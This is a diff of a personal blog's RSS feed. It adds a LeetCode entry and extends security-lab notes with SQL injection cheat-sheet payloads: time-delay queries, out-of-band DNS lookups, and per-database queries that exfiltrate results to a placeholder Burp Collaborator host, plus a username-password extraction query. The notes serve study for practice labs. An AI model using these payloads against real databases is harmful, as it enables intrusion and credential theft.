@@ -10,8 +10,22 @@
         </author>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Tue, 22 Nov 2022 20:13:02 +0800</pubDate>
-        <lastBuildDate>Tue, 22 Nov 2022 20:13:02 +0800</lastBuildDate>
+        <pubDate>Tue, 29 Nov 2022 19:26:56 +0800</pubDate>
+        <lastBuildDate>Tue, 29 Nov 2022 19:26:56 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/11/29/leetcode/</guid>
+            <title>leetcode</title>
+            <link>http://ericcd.com/2022/11/29/leetcode/</link>
+            <category term="LeetCode" scheme="http://ericcd.com/categories/LeetCode/" />
+            <category term="LeetCode" scheme="http://ericcd.com/tags/LeetCode/" />
+            <pubDate>Tue, 29 Nov 2022 19:26:56 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;LeetCode 记录。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用单调栈求坡的最大宽度。&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://ericcd.com/2022/11/22/BurpLab/</guid>
             <title>BurpLab</title>
@@ -19,7 +33,8 @@
             <category term="web" scheme="http://ericcd.com/categories/web/" />
             <category term="web" scheme="http://ericcd.com/tags/web/" />
             <pubDate>Tue, 22 Nov 2022 20:13:02 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+            <description><![CDATA[ &lt;p&gt;1KLKJxV5IF4p6aq0 1KLKJxV5IF4p6aq0&lt;br /&gt;
+ 记录在做 burp lab 时学会的知识点。&lt;br /&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h3&gt;
 &lt;ol&gt;
@@ -54,8 +69,21 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	SUBSTR (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;延时注入。&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	dbms_pipe.receive_message ((&amp;#x27;a&amp;#x27;),10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	WAITFOR DELAY &amp;#x27;0:0:10&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SELECT pg_sleep (10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SELECT SLEEP (10)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;延时注入，但是后端如果异步执行 SQL，可能造成该方法失效。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	dbms_pipe.receive_message ((&amp;#x27;a&amp;#x27;),10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	WAITFOR DELAY &amp;#x27;0:0:10&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SELECT pg_sleep (10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SELECT SLEEP (10)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+11.DNS 查询&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle：SELECT EXTRACTVALUE (xmltype (&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://BURP-COLLABORATOR-SUBDOMAIN/&amp;quot;&amp;gt; % remote;]&amp;gt;&amp;#x27;),&amp;#x27;/l&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              FROM dual（有的版本能用，有的版本已经修复了）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              SELECT UTL_INADDR.get_host_address (&amp;#x27;BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;)（所有版本都能用，但需要权限）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft：  exec master..xp_dirtree &amp;#x27;//BURP-COLLABORATOR-SUBDOMAIN/a&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL： copy (SELECT &amp;#x27;&amp;#x27;) to program &amp;#x27;nslookup BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL： LOAD_FILE (&amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                SELECT ... INTO OUTFILE &amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&amp;#x27;（只适用于 windows 后端）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用 DNS 查询带数据：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT EXTRACTVALUE (xmltype (&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://&amp;#x27;||(SELECT YOUR-QUERY-HERE)||&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN/&amp;quot;&amp;gt; % remote;]&amp;gt;&amp;#x27;),&amp;#x27;/l&amp;#x27;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            FROM dual&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft: declare @p varchar (1024);set @p=(SELECT YOUR-QUERY-HERE);exec (&amp;#x27;master..xp_dirtree &amp;quot;//&amp;#x27;+@p+&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN/a&amp;quot;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL: create OR replace function f () returns void as $$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   declare c text;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   declare p text;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   begin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   SELECT into p (SELECT YOUR-QUERY-HERE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   c := &amp;#x27;copy (SELECT &amp;#x27;&amp;#x27;&amp;#x27;&amp;#x27;) to program &amp;#x27;&amp;#x27;nslookup &amp;#x27;||p||&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;&amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   execute c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   END;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   $$ language plpgsql security definer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   SELECT f ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL: SELECT YOUR-QUERY-HERE INTO OUTFILE &amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&amp;#x27;（仅在 windows 有用）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以用简单的 +,- 来判断某些数字参数是否会被后台执行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当返回只能有一列而结果有多列时，可以考虑以下方法将多列拼成一列。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT username || &amp;#x27;~&amp;#x27; || password FROM users&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h3&gt;
@@ -487,8 +515,8 @@ Context Manager 还提供用于 Android 内的各种系统服务信息。应用�
             <title>Androidmanifest 修改实践</title>
             <link>http://ericcd.com/2022/03/01/Androidmanifest-modify-2022.3.1-1/</link>
             <category term="Android逆向实践" scheme="http://ericcd.com/categories/Android%E9%80%86%E5%90%91%E5%AE%9E%E8%B7%B5/" />
-            <category term="Android逆向" scheme="http://ericcd.com/tags/Android%E9%80%86%E5%90%91/" />
             <category term="ddms" scheme="http://ericcd.com/tags/ddms/" />
+            <category term="Android逆向" scheme="http://ericcd.com/tags/Android%E9%80%86%E5%90%91/" />
             <category term="apktool" scheme="http://ericcd.com/tags/apktool/" />
             <category term="jarsign" scheme="http://ericcd.com/tags/jarsign/" />
             <category term="010Editor" scheme="http://ericcd.com/tags/010Editor/" />
@@ -658,31 +686,6 @@ Frida 是一款很好用的工具，它的其它功能有待后续尝试。&lt;/
 1.ctrl+b 设置断点 (只能在 smali 中设置)。&lt;br /&gt;
 2. 快捷键 q 切换代码界面。&lt;br /&gt;
 3.Debugger-&amp;gt;start-&amp;gt;attach。选择 Process 附加，之后程序开始运行。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/02/27/Android-reverce-2022.2.27-2/</guid>
-            <title>Android 逆向学习 - 2022.2.27-2</title>
-            <link>http://ericcd.com/2022/02/27/Android-reverce-2022.2.27-2/</link>
-            <category term="Android逆向工具" scheme="http://ericcd.com/categories/Android%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/" />
-            <category term="ddms" scheme="http://ericcd.com/tags/ddms/" />
-            <pubDate>Sun, 27 Feb 2022 10:34:09 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;ddms 工具使用记录。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;打开-ddms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#打开-ddms&#34;&gt;#&lt;/a&gt; 打开 ddms&lt;/h1&gt;
-&lt;p&gt;在配置好 sdk 环境的前提下，通过命令行输入 ddms 直接打开。&lt;/p&gt;
-&lt;h1 id=&#34;过滤器使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过滤器使用&#34;&gt;#&lt;/a&gt; 过滤器使用&lt;/h1&gt;
-&lt;p&gt;通 apk 报名设置过滤器。&lt;/p&gt;
-&lt;h1 id=&#34;配合插桩调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配合插桩调试&#34;&gt;#&lt;/a&gt; 配合插桩调试&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;通过 Android Killer 在代码中插入日志输出代码。&lt;/li&gt;
-&lt;li&gt;通过 ddms 查看输出的日志信息。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;因为需要使用寄存器存放输出的日志字符串，所以需要确定声明的寄存器数量 (.locals) 是否足够。&lt;/p&gt;
-&lt;h1 id=&#34;栈跟踪&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#栈跟踪&#34;&gt;#&lt;/a&gt; 栈跟踪&lt;/h1&gt;
-&lt;p&gt;通过插桩找到目标，之后往上分析堆栈确定调用过程。&lt;/p&gt;
-&lt;h1 id=&#34;方法刨析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法刨析&#34;&gt;#&lt;/a&gt; 方法刨析&lt;/h1&gt;
-&lt;p&gt;设置方法刨析，开始刨析后运行 app 中想要分析的功能，之后立即停止方法刨析。凭此获得方法调用表。&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
